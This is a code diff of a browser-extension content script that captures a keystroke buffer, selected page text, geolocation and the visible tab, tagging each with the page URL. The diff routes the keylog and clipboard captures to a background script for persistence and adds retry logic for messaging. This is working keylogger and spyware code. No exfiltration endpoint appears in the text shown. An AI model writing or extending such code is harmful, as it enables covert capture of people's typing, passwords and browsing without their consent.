@@ -7,13 +7,12 @@ if (typeof window === "undefined") {
 }
 
 export async function captureKeylogBuffer(buffer: string) {
-  await simplePrepend<IKeyLogEntry>(StorageKey.KEY_LOG, {
-    ...contextData(),
-    url: window.location.href,
+  // Send to background to decide whether to persist (background applies site filters)
+  await sendMessage(BackgroundMessage.UPDATE_KEY_LOG, {
     buffer,
+    url: window.location.href,
+    context: contextData(),
   });
-
-  writeLog("Wrote keylog buffer");
 }
 
 export async function captureGeolocation() {
@@ -57,13 +56,12 @@ export function captureClipboard() {
   const text = window.getSelection()?.toString();
 
   if (text) {
-    simplePrepend(StorageKey.CLIPBOARD_LOG, {
+    // Send clipboard to background so it can decide whether to persist
+    sendMessage(BackgroundMessage.UPDATE_CLIPBOARD, {
       text,
       url: window.location.href,
-      ...contextData(),
+      context: contextData(),
     });
-
-    writeLog("Wrote clipboard");
   }
 }
 
@@ -74,8 +72,35 @@ export function captureVisibleTab() {
 }
 
 export async function sendMessage(messageType: BackgroundMessage, data?: any) {
-  return chrome.runtime.sendMessage({
-    messageType,
-    data,
-  });
+  const maxAttempts = 3;
+  let attempt = 0;
+  let backoff = 100;
+  while (attempt < maxAttempts) {
+    try {
+      return await chrome.runtime.sendMessage({ messageType, data });
+    } catch (e: any) {
+      const msg = (e && e.message) || String(e);
+      // If the receiving end doesn't exist or the extension context is
+      // invalidated, it's often transient (background restarting). Retry a
+      // few times with exponential backoff. For other errors, bail out.
+      if (
+        msg.includes("Could not establish connection") ||
+        msg.includes("Extension context invalidated")
+      ) {
+        attempt++;
+        if (attempt >= maxAttempts) {
+          console.warn("sendMessage failed after retries:", e);
+          return null;
+        }
+        await new Promise((r) => setTimeout(r, backoff));
+        backoff *= 2;
+        continue;
+      }
+
+      // Non-transient error — log once and return
+      console.warn("sendMessage failed:", e);
+      return null;
+    }
+  }
+  return null;
 }
